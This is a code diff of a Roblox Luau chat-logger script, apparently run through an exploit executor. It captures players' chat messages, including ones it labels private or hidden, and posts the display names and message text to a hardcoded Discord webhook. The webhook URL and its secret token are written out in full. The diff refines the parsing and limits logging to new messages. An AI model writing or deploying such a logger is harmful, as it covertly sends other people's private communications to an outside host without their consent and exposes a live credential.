@@ -1,6 +1,5 @@
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
 
 local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1495387476867551474/KD8pq8e7P-nU7O2jEhKpTCV2G1wzWVDcjZ07bEOWGaJr-twJChTw5ZBSibfONVwfqaui"
 
@@ -33,41 +32,31 @@ local function getEmbedColor(buttonText)
 		return (r * 65536) + (g * 256) + b
 	end
 	
-	-- Default color if nothing matches
+	-- Default color
 	return 0xffffff
 end
 
-local function extractDisplay(buttonText)
-	-- Try to extract display name from the text
-	local display = string.match(buttonText, "%((.-)%)")
-	return display or "Unknown"
-end
-
-local function sendWebhook(username, userId, message, embedColor, buttonText)
-	local isPrivate = string.match(buttonText, "%[From") or string.match(buttonText, "%[To")
-	local isHidden = string.match(buttonText, "HIDDEN CHAT")
+local function sendWebhook(display, message, embedColor, buttonText)
+	local prefix = ""
 	
-	local titlePrefix = ""
-	if isPrivate then
-		titlePrefix = "(PRIVATE) "
-	elseif isHidden then
-		titlePrefix = "(HIDDEN) "
+	-- Only add (PRIVATE) prefix for private messages
+	if string.match(buttonText, "%[From") or string.match(buttonText, "%[To") then
+		prefix = "*(PRIVATE)* "
 	end
+	-- Hidden chats don't get a prefix, just red embed color
+	
+	local title = prefix .. "**" .. display .. "** " .. message
 	
 	local embed = {
-		["title"] = titlePrefix .. "Display: " .. extractDisplay(buttonText),
-		["description"] = "**" .. username .. "**: " .. message,
-		["color"] = embedColor,
-		["footer"] = {
-			["text"] = "User ID: " .. userId
-		}
+		["title"] = title,
+		["color"] = embedColor
 	}
 	
 	local payload = {
 		["embeds"] = {embed}
 	}
 	
-	local success, err = pcall(function()
+	pcall(function()
 		request({
 			Url = WEBHOOK_URL,
 			Method = "POST",
@@ -77,10 +66,6 @@ local function sendWebhook(username, userId, message, embedColor, buttonText)
 			Body = HttpService:JSONEncode(payload)
 		})
 	end)
-	
-	if not success then
-		warn("Webhook failed:", err)
-	end
 end
 
 local function onFrameAdded(frame)
@@ -94,50 +79,59 @@ local function onFrameAdded(frame)
 	-- Ignore if userId is "0" or nil
 	if not userId or userId == "0" then return end
 	
-	task.wait(0.1) -- Small delay to ensure children are loaded
+	task.wait(0.1)
 	
 	local textMessage = frame:FindFirstChild("TextMessage")
 	if not textMessage then return end
 	
+	local prefixText = textMessage:FindFirstChild("PrefixText")
 	local bodyText = textMessage:FindFirstChild("BodyText")
 	local textButton = textMessage:FindFirstChild("TextMessageButton")
 	
-	if not bodyText or not textButton then return end
+	if not prefixText or not bodyText or not textButton then return end
 	
 	local textButtonButton = textButton:FindFirstChild("TextButton")
 	if not textButtonButton then return end
 	
-	-- Get the message content
-	local message = bodyText.ContentText
+	-- Get the display name from PrefixText
+	local display = prefixText.ContentText
+	
+	-- Remove [To display] or [From display] from prefix if it's a private message
+	display = string.gsub(display, "%[To .-%] ", "")
+	display = string.gsub(display, "%[From .-%] ", "")
+	
+	-- Get the full message from BodyText
+	local fullMessage = bodyText.ContentText
+	
+	-- Remove the display prefix from the message
+	local message = fullMessage
+	if string.sub(fullMessage, 1, #display) == display then
+		message = string.sub(fullMessage, #display + 1) -- Remove display prefix
+		message = string.match(message, "^%s*(.-)%s*$") -- Trim whitespace
+	end
 	
 	-- Get the button text for color/type detection
 	local buttonText = textButtonButton.Text
-	
-	-- Get username from Players service
-	local player = Players:GetPlayerByUserId(tonumber(userId))
-	local username = player and player.Name or "Unknown"
 	
 	-- Determine embed color based on button text
 	local embedColor = getEmbedColor(buttonText)
 	
 	-- Send webhook
-	sendWebhook(username, userId, message, embedColor, buttonText)
+	sendWebhook(display, message, embedColor, buttonText)
 end
 
--- Monitor for new frames being added
+-- Mark all existing frames as processed (don't send past messages)
+for _, child in pairs(RCTScrollContentView:GetChildren()) do
+	if child:IsA("Frame") then
+		processedFrames[child] = true
+	end
+end
+
+-- Monitor for new frames being added (only future messages)
 RCTScrollContentView.ChildAdded:Connect(function(child)
 	if child:IsA("Frame") then
 		onFrameAdded(child)
 	end
 end)
 
--- Process existing frames
-for _, child in pairs(RCTScrollContentView:GetChildren()) do
-	if child:IsA("Frame") then
-		task.spawn(function()
-			onFrameAdded(child)
-		end)
-	end
-end
-
-print("Chat logger started!")
+print("Chat logger started! Only logging new messages.")
